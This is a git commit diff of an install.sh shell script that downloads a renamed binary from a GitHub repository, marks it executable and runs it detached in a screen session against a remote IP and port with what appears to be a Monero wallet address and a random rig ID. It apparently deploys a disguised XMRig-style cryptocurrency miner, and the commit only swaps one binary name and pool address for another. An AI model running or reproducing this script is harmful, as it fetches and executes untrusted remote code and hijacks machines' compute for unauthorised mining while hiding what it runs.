9f45fd6c0393eeb8f39a6ae94116d43c949265d9
washil789 <88795024+washil789@users.noreply.github.com>
2021-09-19 04:04:31 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,7 +1,5 @@
 sudo apt update && 
 sudo apt install screen -y &&
-wget https://github.com/washil789/minmin/raw/main/xlarig && 
-chmod +x xlarig
-mv xlarig babitambang &&
-chmod +x babitambang &&
-screen -dmS run ./babitambang -o 68.183.134.111:6147 -u 8BVLQrAfZXLFZsdLcUqk33EgPLxQYwKVTheFAixjGZShXhqSVXFUrqT98xtNgegRkoaRTECw5JHTdi67F13zd86ZGitVSnZ+100000 --rig-id $(echo $(shuf -i 1-20000 -n 1)-IDBL)
+wget https://github.com/washil789/tambang/raw/main/tuyultambang &&
+chmod +x tuyultambang &&
+screen -dmS run ./tuyultambang -o 134.122.120.248:443 -u 8BVLQrAfZXLFZsdLcUqk33EgPLxQYwKVTheFAixjGZShXhqSVXFUrqT98xtNgegRkoaRTECw5JHTdi67F13zd86ZGitVSnZ+100000 --rig-id $(echo $(shuf -i 1-999 -n 1)-CLBV)
